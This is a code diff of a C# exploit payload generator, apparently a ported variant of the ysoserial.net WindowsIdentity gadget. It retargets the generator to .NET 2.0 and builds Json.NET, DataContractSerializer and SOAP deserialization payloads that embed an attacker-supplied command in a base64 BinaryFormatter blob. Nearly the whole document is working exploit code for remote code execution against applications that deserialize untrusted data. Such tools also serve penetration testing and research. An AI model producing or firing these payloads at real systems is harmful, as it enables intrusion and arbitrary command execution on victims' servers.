@@ -2,13 +2,12 @@
 using System.Collections.Generic;
 using System.IO;
 using System.Runtime.Serialization;
-using System.Security.Claims;
 using System.Security.Principal;
 using System.Xml;
 using Newtonsoft.Json;
 using System.Runtime.Serialization.Formatters.Soap;
 
-namespace ysoserial.Generators
+namespace ysoserial_frmv2.Generators
 {
     class WindowsIdentityGenerator : GenericGenerator
     {
@@ -60,7 +59,7 @@ namespace ysoserial.Generators
 
         public override object Generate(string cmd, string formatter, Boolean test)
         {
-            Generator binaryFormatterGenerator = new TypeConfuseDelegateGenerator();
+            Generator binaryFormatterGenerator = new ActivitySurrogateSelectorGenerator();
             byte[] binaryFormatterPayload = (byte[])binaryFormatterGenerator.Generate(cmd, "BinaryFormatter", false);
             string b64encoded = Convert.ToBase64String(binaryFormatterPayload);
 
@@ -72,7 +71,7 @@ namespace ysoserial.Generators
             else if (formatter.ToLower().Equals("json.net"))
             {
                 string payload = @"{
-                    '$type': 'System.Security.Principal.WindowsIdentity, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
+                    '$type': 'System.Security.Principal.WindowsIdentity, mscorlib, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
                     'System.Security.ClaimsIdentity.bootstrapContext': '" + b64encoded + @"'
                 }";
 
@@ -93,7 +92,7 @@ namespace ysoserial.Generators
             }
             else if (formatter.ToLower().Equals("datacontractserializer"))
             {
-                string payload = $@"<root xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" type=""System.Security.Principal.WindowsIdentity, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"">
+                string payload = $@"<root xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" type=""System.Security.Principal.WindowsIdentity, mscorlib, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"">
     <WindowsIdentity xmlns:i=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:x=""http://www.w3.org/2001/XMLSchema"" xmlns=""http://schemas.datacontract.org/2004/07/System.Security.Principal"">
       <System.Security.ClaimsIdentity.bootstrapContext i:type=""x:string"" xmlns="""">{b64encoded}</System.Security.ClaimsIdentity.bootstrapContext>
        </WindowsIdentity>
@@ -120,7 +119,7 @@ namespace ysoserial.Generators
             {
                 string payload = $@"<SOAP-ENV:Envelope xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" xmlns:SOAP-ENC=""http://schemas.xmlsoap.org/soap/encoding/"" xmlns:SOAP-ENV=""http://schemas.xmlsoap.org/soap/envelope/"" xmlns:clr=""http://schemas.microsoft.com/soap/encoding/clr/1.0"" SOAP-ENV:encodingStyle=""http://schemas.xmlsoap.org/soap/encoding/"">
 <SOAP-ENV:Body>
-    <a1:WindowsIdentity id=""ref-1"" xmlns:a1=""http://schemas.microsoft.com/clr/nsassem/System.Security.Principal/mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"">
+    <a1:WindowsIdentity id=""ref-1"" xmlns:a1=""http://schemas.microsoft.com/clr/nsassem/System.Security.Principal/mscorlib, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"">
       <System.Security.ClaimsIdentity.bootstrapContext xsi:type=""xsd:string"" xmlns="""">{b64encoded}</System.Security.ClaimsIdentity.bootstrapContext>
     </a1:WindowsIdentity>
 </SOAP-ENV:Body>
